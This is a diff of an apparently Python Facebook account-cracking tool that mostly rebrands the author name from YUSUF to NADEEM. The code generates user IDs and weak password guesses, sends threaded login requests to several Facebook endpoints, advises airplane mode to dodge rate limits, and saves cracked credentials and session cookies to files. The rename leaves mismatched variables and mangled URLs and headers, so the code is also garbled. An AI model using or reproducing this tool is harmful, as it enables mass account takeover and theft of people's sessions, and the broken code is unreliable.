@@ -1,6 +1,6 @@
 #Decode by NADEEM x KAMEENA
-#FACEBOOK https://www.facebook.com/profile.php?id=61565906489735
-#Join more open source https://www.facebook.com/profile.php?id=61565906489735nadeemtricker
+#FACEBOOK https://www.61565906489735
+#Join more open source https://www.61565906489735nadeemtricker
 
 
 
@@ -1492,8 +1492,7 @@ logo = """
 888 Y88b888    d88P  888 888    888  888   888 Y888P 888      888  88888 
 888  Y88888   d88P   888 888    888  888   888  Y8P  888      888    888 
 888   Y8888  d8888888888 888  .d88P  888   888   "   888      Y88b  d88P 
-888    Y888 d88P     888 8888888P" 8888888 888       888       "Y8888P88 
-                                                                                                                                                                                                                                            
+888    Y888 d88P     888 8888888P" 8888888 888       888       "Y8888P88                                                                                                                                                                                                                                            
 \033[32m                          
 \033[32m                          
 \033[1;32m                           
@@ -1501,7 +1500,7 @@ logo = """
 \033[1;32m                             
   \033[1;32m                                                         
 ===============================================
- [â¢]\033[1;37m AUTHOR       : \033[1;37m YUSUF KAMEENA YUSUF
+ [â¢]\033[1;37m AUTHOR       : \033[1;37m BROKEN NADEEM INSIDE
  [â¢]\033[1;37m TOOL STATUS  :\033[1;37m FUCK YOU
  [â¢]\033[1;37m TOOL VERSION :\033[1;37m  OPEN SOURCE 
 ==============================================="""
@@ -1903,7 +1902,7 @@ def YUSUF4():
         tl = str(len(user))
         print(f"[+] YOUR TOTAL IDZ  : "+tl+" ")
         print(f"[+] YOUR CODE CHOOSED : "+kode)
-        print(f'[+] YOUR METHOD CHOOSED : M{YUSUFfire}')
+        print(f'[+] YOUR METHOD CHOOSED : M{NADEEMFfire}')
         linex();print('    USE FLIGHT (\033[1;32mAIRPLANE\033[1;32m) MODE BEFORE USE');linex()
         for love in user:
             uid = kode+love
@@ -1953,7 +1952,7 @@ def YUSUF5():
     print(" [5] METHOD (METHOD5) ")
     print(" [6] METHOD (METHOD6) ")
     linex()
-    YUSUFfire = input("[+] [CHOOSE] :- ")
+    NADEEMfire = input("[+] [CHOOSE] :- ")
     linex()
     print(" [+] Do You Want To Show Cookies : (Y/N) ")
     linex()
@@ -1968,21 +1967,21 @@ def YUSUF5():
         tl = str(len(user))
         print(f"[+] YOUR CODE CHOOSED : "+code)
         print(f"[+] YOUR TOTAL IDZ : "+tl+" ")
-        print(f'[+] YOUR METHOD CHOOSED : M{YUSUFfire}')
+        print(f'[+] YOUR METHOD CHOOSED : M{NADEEMfire}')
         linex();print('    USE FLIGHT (\033[1;37mAIRPLANE\033[1;37m) MODE BEFORE USE');linex()
         for love in user:
             uid = code+love
             pwx = [love,uid[:6]]
             for Eman in HamiiID:
                 pwx.append(Eman)
-            if YUSUFfire =='1':YUSUF_xd.submit(mbasic,uid,pwx,tl)
-            elif YUSUFfire =='2':YUSUF_xd.submit(p,uid,pwx,tl)
-            elif YUSUFfire =='3':YUSUF_xd.submit(x,uid,pwx,tl)
-            elif YUSUFfire =='4':YUSUF_xd.submit(mobile,uid,pwx,tl)
-            elif YUSUFfire =='5':YUSUF_xd.submit(freeq,uid,pwx,tl)
-            elif YUSUFfire =='6':YUSUF_xd.submit(d,uid,pwx,tl)
+            if NADEEMfire =='1':NADEEM_xd.submit(mbasic,uid,pwx,tl)
+            elif NADEEMfire =='2':NADEEM_xd.submit(p,uid,pwx,tl)
+            elif NADEEMfire =='3':NADEEM_xd.submit(x,uid,pwx,tl)
+            elif NADEEMfire =='4':NADEEM_xd.submit(mobile,uid,pwx,tl)
+            elif NADEEMfire =='5':NADEEM_xd.submit(freeq,uid,pwx,tl)
+            elif NADEEMfire =='6':NADEEM_xd.submit(d,uid,pwx,tl)
             else:
-                YUSUF_xd.submit(p,uid,pwx,tl)
+                NADEEM_xd.submit(p,uid,pwx,tl)
     linex()
     print('[â] CRACK PROCESS COMPLETE')
     print('[â] TOTAL OK ACCOUNTS : '+str(len(oks)))
@@ -2026,25 +2025,25 @@ def YUSUF6():
         tl = str(len(user))
         print(f"[+] YOUR LIMIT IDZ  : "+tl+" ")
         print(f"[+] YOUR CODE CHOOSED : "+kode)
-        print(f'[+] YOUR METHOD CHOOSED : M{YUSUFfire}')
+        print(f'[+] YOUR METHOD CHOOSED : M{NADEEMfire}')
         linex();print('    USE FLIGHT (\033[1;37mAIRPLANE\033[1;37m) MODE BEFORE USE');linex()
         for love in user:
             uid = kode+love
             mk = uid[:6]
             pwx = [love]
             pwx = [kode+love,mk,'free fire','i love you','57273200']
-            if YUSUFfire =='1':YUSUF_xd.submit(mbasic,uid,pwx,tl)
-            elif YUSUFfire =='2':YUSUF_xd.submit(p,uid,pwx,tl)
-            elif YUSUFfire =='3':YUSUF_xd.submit(x,uid,pwx,tl)
-            elif YUSUFfire =='4':YUSUF_xd.submit(mobile,uid,pwx,tl)
-            elif YUSUFfire =='5':YUSUF_xd.submit(freeq,uid,pwx,tl)
-            elif YUSUFfire =='6':YUSUF_xd.submit(d,uid,pwx,tl)
+            if NADEEMfire =='1':NADEEM_xd.submit(mbasic,uid,pwx,tl)
+            elif NADEEMfire =='2':NADEEM_xd.submit(p,uid,pwx,tl)
+            elif NADEEMfire =='3':NADEEM_xd.submit(x,uid,pwx,tl)
+            elif NADEEMfire =='4':NADEEM_xd.submit(mobile,uid,pwx,tl)
+            elif NADEEMfire =='5':NADEEM_xd.submit(freeq,uid,pwx,tl)
+            elif YNADEEMfire =='6':NADEEM_xd.submit(d,uid,pwx,tl)
             else:
-                YUSUF_xd.submit(p,uid,pwx,tl)
+                NADEEM_xd.submit(p,uid,pwx,tl)
     linex()
     print('[â] CRACK PROCESS COMPLETE')
     print('[â] TOTAL OK ACCOUNTS : '+str(len(oks)))
-    print('[â] ID SAVE YUSUF-OK TXT')
+    print('[â] ID SAVE NADEEM-OK TXT')
     linex()
 
 def n_clone():
@@ -2091,7 +2090,7 @@ def g_clone():
     user=[]
     os.system('clear')
     print(logo)
-    print(" Ex First : ayesha, kazim, YUSUF ")
+    print(" Ex First : ayesha, kazim, NADEEM ")
     print(" Ex Last  : rajput, channa, aaraya ")
     print(47*'-')
     first = input(' [â¢] First Name : ')
@@ -2126,7 +2125,7 @@ def g_clone():
         cookie_show.append("yes")
     else:
         cookie_show.append("no")
-    with ThreadPool(max_workers=30) as YUSUF_xd:
+    with ThreadPool(max_workers=30) as NADEEM_xd:
         tl = str(len(user))
         os.system("clear")
         print(logo)
@@ -2137,25 +2136,25 @@ def g_clone():
         for love in user:
             uid = first+'.'+last+'.'+love+domain
             pwx = [first+last,first+' '+last,first+last+'12',last,first+love,first+'123',first+'1234',first+last+'12']
-            if YUSUFfire =='1':YUSUF_xd.submit(mbasic,uid,pwx,tl)
-            elif YUSUFfire =='2':YUSUF_xd.submit(p,uid,pwx,tl)
-            elif YUSUFfire =='3':YUSUF_xd.submit(x,uid,pwx,tl)
-            elif YUSUFfire =='4':YUSUF_xd.submit(mobile,uid,pwx,tl)
-            elif YUSUFfire =='5':YUSUF_xd.submit(freeq,uid,pwx,tl)
-            elif YUSUFfire =='6':YUSUF_xd.submit(d,uid,pwx,tl)
+            if YUSUFfire =='1':NADEEM_xd.submit(mbasic,uid,pwx,tl)
+            elif YUSUFfire =='2':NADEEM_xd.submit(p,uid,pwx,tl)
+            elif YUSUFfire =='3':NADEEM_xd.submit(x,uid,pwx,tl)
+            elif YUSUFfire =='4':NADEEM_xd.submit(mobile,uid,pwx,tl)
+            elif YUSUFfire =='5':NADEEM_xd.submit(freeq,uid,pwx,tl)
+            elif YUSUFfire =='6':NADEEM_xd.submit(d,uid,pwx,tl)
             else:
                 YUSUF_xd.submit(p,uid,pwx,tl)
     linex()
     print('[â] CRACK PROCESS COMPLETE')
     print('[â] TOTAL OK ACCOUNTS : '+str(len(oks)))
-    print('[â] ID SAVE YUSUF-OK TXT')
+    print('[â] ID SAVE NADEEM-OK TXT')
     linex()
 
 def freefb(uid, name, pwx, tl):
     global loop
     global oks
     global cps
-    sys.stdout.write("\r\033[1;37m [YUSUF-M1] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
+    sys.stdout.write("\r\033[1;37m [NADEEM-M1] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
     sys.stdout.flush()
     try:
         first = name.split(" ")[0]
@@ -2182,7 +2181,7 @@ def freefb(uid, name, pwx, tl):
             headers = {
             'Host': 'mbasic.facebook.com',
             'method': 'POST',
-            'path': '/login/YUSUFice-based/login/async/',
+            'path': '/login/NADEEMice-based/login/async/',
             'scheme': 'https',
             'content-length': '294',
             'Accept-Encoding': 'gzip',
@@ -2213,9 +2212,9 @@ def freefb(uid, name, pwx, tl):
             log_cookies = session.cookies.get_dict().keys()
             if "c_user" in log_cookies:
                 coki = ";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                print(f" {green}[YUSUF-OK] {uid}|{pw}")
+                print(f" {green}[-NADEEM-OK-] {uid}|{pw}")
                 print(f" {white}[COOKIES] {green}{coki}")
-                open("/sdcard/YUSUF_file_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
+                open("/sdcard/NADEEM_file_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                 oks.append(uid+"|"+pw)
                 break
             elif "checkpoint" in log_cookies:
@@ -2241,7 +2240,7 @@ def bapi(uid, name, pwx, tl):
     global loop
     global oks
     global cps
-    sys.stdout.write("\r\033[1;37m [YUSUF-M2] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
+    sys.stdout.write("\r\033[1;37m [-NADEEM-M2] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
     sys.stdout.flush()
     try:
         first = name.split(" ")[0]
@@ -2289,7 +2288,7 @@ def bapi(uid, name, pwx, tl):
                 'X-FB-Connection-Type': 'WIFI',
                 'X-Tigon-Is-Retry': 'False',
                 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
-                'x-fb-YUSUFice-group': '5120',
+                'x-fb-NADEEMice-group': '5120',
                 'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                 'X-FB-Request-Analytics-Tags': 'graphservice',
                 'X-FB-HTTP-Engine': 'Liger',
@@ -2301,14 +2300,14 @@ def bapi(uid, name, pwx, tl):
             result = requests.post(url, data=data, headers=headers).json()
             if "session_key" in result:
                 coki = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
-                print(f" {green}[YUSUF-OK] {uid}|{pw}")
+                print(f" {green}[-NADEEM-OK-] {uid}|{pw}")
                 print(f" {white}[COOKIES] {green}{coki}")
-                open("/sdcard/YUSUF_file_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
+                open("/sdcard/NADEEM_file_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                 oks.append(uid+"|"+pw)
                 break
             elif "www.facebook.com" in result["error"]["message"]:
-                print(f" {red}[YUSUF-CP] {uid}|{pw}")
-                open("/sdcard/YUSUF_file_tf.txt", "a").write(f"{uid}|{pw}\n")
+                print(f" {red}[-NADEEM-CP-] {uid}|{pw}")
+                open("/sdcard/NADEEM_file_tf.txt", "a").write(f"{uid}|{pw}\n")
                 cps.append(uid+"|"+pw)
                 break
             else:
@@ -2323,7 +2322,7 @@ def graph(uid, name, pwx, tl):
     global loop
     global oks
     global cps
-    sys.stdout.write("\r\033[1;37m [YUSUF-M3] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
+    sys.stdout.write("\r\033[1;37m [NADEEM-M3] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
     sys.stdout.flush()
     try:
         first = name.split(" ")[0]
@@ -2344,7 +2343,7 @@ def graph(uid, name, pwx, tl):
                 'community_id': '',
                 'cpl': 'true',
                 'try_num': '1',
-                'family_YUSUFice_id': str(uuid.uuid4()),
+                'family_NADEEMice_id': str(uuid.uuid4()),
                 'credentials_type': 'password',
                 'source': 'login',
                 'error_detail_type': 'button_with_disabled',
@@ -2383,14 +2382,14 @@ def graph(uid, name, pwx, tl):
             result = requests.post(url, data=data, headers=headers).json()
             if "session_key" in result:
                 coki = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
-                print(f" {green}[YUSUF-OK] {uid}|{pw}")
+                print(f" {green}[-NADEEM-OK-] {uid}|{pw}")
                 print(f" {white}[COOKIES] {green}{coki}")
-                open("/sdcard/YUSUF_file_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
+                open("/sdcard/NADEEM_file_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                 oks.append(uid+"|"+pw)
                 break
             elif "www.facebook.com" in result["error"]["message"]:
-               #print(f" {red}[YUSUF-CP] {uid}|{pw}")
-                open("/sdcard/YUSUF_file_2f.txt", "a").write(f"{uid}|{pw}\n")
+               #print(f" {red}[-NADEEM-CP-] {uid}|{pw}")
+                open("/sdcard/NADEEM_file_2f.txt", "a").write(f"{uid}|{pw}\n")
                 cps.append(uid+"|"+pw)
                 break
             else:
@@ -2405,7 +2404,7 @@ def mbasic(uid,pwx,tl):
     global loop
     global oks
     global cps
-    sys.stdout.write("\r\033[1;37m [M1-YUSUF] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
+    sys.stdout.write("\r\033[1;37m [M1-NADEEM] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
     sys.stdout.flush()
     try:
         for pw in pwx:
@@ -2467,13 +2466,13 @@ def mbasic(uid,pwx,tl):
                 c = check_lock(uid)
                 if "live" in c:
                     if result["is_account_confirmed"] == False:
-                        print(f" {green}[YUSUF-OK] {uid}|{pw}")
+                        print(f" {green}[-NADEEM-OK-] {uid}|{pw}")
                        #print(f" {green}[COOKIES] {green}{coki}")
                         open("/sdcard/YUSUF-novery.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                     else:
-                        print(f" {green}[YUSUF-OK] {uid}|{pw}")
+                        print(f" {green}[-NADEEM-OK-] {uid}|{pw}")
                        #print(f" {green}[COOKIES] {green}{coki}")
-                        open("/sdcard/YUSUF_random_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
+                        open("/sdcard/NADEEM_random_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                         oks.append(uid)
                         break
             else:
@@ -2488,7 +2487,7 @@ def p(uid,pwx,tl):
     global loop
     global oks
     global cps
-    sys.stdout.write("\r\033[1;37m [M2-YUSUF] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
+    sys.stdout.write("\r\033[1;37m [M2-NADEEM] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
     sys.stdout.flush()
     try:
         for pw in pwx:
@@ -2529,7 +2528,7 @@ def p(uid,pwx,tl):
                 'X-FB-Connection-Type': 'WIFI',
                 'X-Tigon-Is-Retry': 'False',
                 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
-                'x-fb-YUSUFice-group': '5120',
+                'x-fb-NADEEMice-group': '5120',
                 'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                 'X-FB-Request-Analytics-Tags': 'graphservice',
                 'X-FB-HTTP-Engine': 'Liger',
@@ -2550,13 +2549,13 @@ def p(uid,pwx,tl):
                 c = check_lock(uid)
                 if "live" in c:
                     if result["is_account_confirmed"] == False:
-                        print(f" {green}[YUSUF-OK] {uid}|{pw}")
+                        print(f" {green}[-NADEEM-OK] {uid}|{pw}")
                        #print(f" {green}[COOKIES] {green}{coki}")
-                        open("/sdcard/YUSUF-novery.txt", "a").write(f"{uid}|{pw}|{coki}\n")
+                        open("/sdcard/NADEEM-novery.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                     else:
-                        print(f" {green}[YUSUF-OK] {uid}|{pw}")
+                        print(f" {green}[-NADEEM-OK-] {uid}|{pw}")
                        #print(f" {green}[COOKIES] {green}{coki}")
-                        open("/sdcard/YUSUF_random_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
+                        open("/sdcard/NADEEM_random_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                         oks.append(uid)
                         break
             else:
@@ -2571,8 +2570,8 @@ def x(uid,pwx,tl):
     global loop
     global oks
     global cps
-    global YUSUFua
-    sys.stdout.write('\r\33[1;37m[M3-YUSUF] %s|OK:%s \r'%(loop,len(oks))),
+    global NADEEMua
+    sys.stdout.write('\r\33[1;37m[M3-NADEEM] %s|OK:%s \r'%(loop,len(oks))),
     sys.stdout.flush()
     try:
         for ps in pwx:
@@ -2611,7 +2610,7 @@ def x(uid,pwx,tl):
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
     'viewport-width': '980',
 }
-            lo = session.post('https://x.facebook.com/login/YUSUFice-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+            lo = session.post('https://x.facebook.com/login/NADEEMice-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             #print(iid+'|'+pws+'|'+str(log_cookies))
             if 'c_user' in log_cookies:
@@ -2621,26 +2620,26 @@ def x(uid,pwx,tl):
                 d = "YUSUF"
                 if "live" in check_lock(cid):
                     if '%3A-1%3A-1' in coki:
-                        print('\33[1;94m[YUSUF-NV] '+cid+' | '+ps+'\33[0;97m')
+                        print('\33[1;94m[NADEEM-NV] '+cid+' | '+ps+'\33[0;97m')
                         break
                     else:
-                        print('\33[1;92m[YUSUF-OK] '+cid+' | '+ps+'\33[0;97m')
+                        print('\33[1;92m[NADEEM-OK] '+cid+' | '+ps+'\33[0;97m')
                         if "yes" in cookie_show:
                             print(f"\033[1;32mCOOKIES : {coki}")
-                            open('/sdcard/YUSUF-Rndm-Ok.txt', 'a').write(f'{cid}|{ps}|{coki}\n')
+                            open('/sdcard/NADEEM-Rndm-Ok.txt', 'a').write(f'{cid}|{ps}|{coki}\n')
                             oks.append(cid)
                             break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[141:156]
                 if "Enter login code to continue" in log_cookies:
-                    #print('\33[1;94m[YUSUF-2F] '+uid+' | '+ps+'\33[0;97m')
-                    open('/sdcard/YUSUF-2f.txt', 'a').write(uid+' | '+ps+'\n')
+                    #print('\33[1;94m[NADEEM-2F] '+uid+' | '+ps+'\33[0;97m')
+                    open('/sdcard/NADEEM-2f.txt', 'a').write(uid+' | '+ps+'\n')
                     twf.append(uid)
                     break
                 else:
-                    #print('\33[1;91m[YUSUF-CP] '+uid+' | '+ps+'\33[0;97m')
-                    open('/sdcard/YUSUF-Cp.txt', 'a').write(uid+' | '+ps+'\n')
+                    #print('\33[1;91m[-NADEEM-CP-] '+uid+' | '+ps+'\33[0;97m')
+                    open('/sdcard/NADEEM-Cp.txt', 'a').write(uid+' | '+ps+'\n')
                     cps.append(uid)
                     break
             else:
@@ -2657,7 +2656,7 @@ def mobile(uid,pwx,tl):
     global loop
     global oks
     global cps
-    sys.stdout.write("\r\033[1;37m [M4-YUSUF] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
+    sys.stdout.write("\r\033[1;37m [M4-NADEEM] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
     sys.stdout.flush()
     try:
         for pw in pwx:
@@ -2719,13 +2718,13 @@ def mobile(uid,pwx,tl):
                 c = check_lock(uid)
                 if "live" in c:
                     if result["is_account_confirmed"] == False:
-                        print(f" {green}[YUSUF-OK] {uid}|{pw}")
+                        print(f" {green}[-NADEEM-OK-] {uid}|{pw}")
                        #print(f" {green}[COOKIES] {green}{coki}")
                         open("/sdcard/YUSUF-novery.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                     else:
-                        print(f" {green}[YUSUF-OK] {uid}|{pw}")
+                        print(f" {green}[-NADEEM-OK-] {uid}|{pw}")
                        #print(f" {green}[COOKIES] {green}{coki}")
-                        open("/sdcard/YUSUF_random_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
+                        open("/sdcard/NADEEM_random_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                         oks.append(uid)
                         break
             else:
@@ -2747,7 +2746,7 @@ def freeq(uid,pwx,tl):
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
-                'YUSUFice_id': str(uuid.uuid4()),
+                'NADEEMice_id': str(uuid.uuid4()),
                 'email': uid,
                 'password': pw,
                 'generate_analytics_claims': '1',
@@ -2800,13 +2799,13 @@ def freeq(uid,pwx,tl):
                 except:
                     uid = uid
                 if result["is_account_confirmed"] == False:
-                    print(f" {green}[YUSUF-OK] {uid}|{pw}")
+                    print(f" {green}[-NADEEM-OK-] {uid}|{pw}")
                    #print(f" {green}[COOKIES] {red}{coki}")
                     open("/sdcard/YUSUF-novery.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                 else:
-                    print(f" {green}[YUSUF-OK] {uid}|{pw}")
+                    print(f" {green}[-NADEEM-OKY-] {uid}|{pw}")
                    #print(f" {white}[COOKIES] {green}{coki}")
-                    open("/sdcard/YUSUF_random_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
+                    open("/sdcard/NADEEM_random_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                     oks.append(uid)
                     break
             else:
